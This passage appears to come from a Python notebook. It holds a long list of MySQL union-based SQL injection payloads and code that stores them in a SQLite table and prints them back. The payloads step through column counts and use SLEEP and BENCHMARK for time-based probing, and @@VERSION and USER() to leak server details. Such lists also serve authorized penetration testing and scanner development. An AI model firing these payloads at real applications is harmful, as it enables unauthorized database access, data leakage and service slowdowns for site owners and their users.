"UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13",
"UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14",
"UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15",
"UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16",
"UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17",
"UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18",
"UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19",
"UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20",
"UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21",
"UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22",
"UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23",
"UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24",
"UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25",
"UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26",
"UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27",
"UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28",
"UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29",
"UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30",  
"UNION SELECT @@VERSION,SLEEP(5),\"'3\"",
"UNION SELECT @@VERSION,SLEEP(5),\"'3'\"#",
"UNION SELECT @@VERSION,SLEEP(5),USER(),4#",
"UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5#",
"UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6#",
"UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7#",
"UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8#",
"UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9#",
"UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10#",
"UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11#",
"UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12#",
"UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13#",
"UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14#",
"UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15#",
"UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16#",
"UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17#",
"UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18#",
"UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19#",
"UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20#",
"UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21#",
"UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22#",
"UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23#",
"UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24#",
"UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25#",
"UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26#",
"UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27#",
"UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28#",
"UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29#",
"UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30#",   
   ]

for payload in payloads:
   cursor.execute("INSERT INTO sql_injection_payloads (payload) VALUES (?)", (payload,))

# Commit the changes
conn.commit()

# Close the connection
conn.close()

import sqlite3

# Connect to the SQLite database
conn = sqlite3.connect('payloads.db')

# Create a cursor object to execute SQL commands
cursor = conn.cursor()

# Execute a SELECT query to retrieve the payloads
cursor.execute("SELECT * FROM sql_injection_payloads")

# Fetch all the rows returned by the query
payloads = cursor.fetchall()

# Print the payloads
for payload in payloads:
   print(payload[1])  # Assuming payload is stored in the second column

# Close the connection
conn.close()






# In[ ]:





# In[ ]:




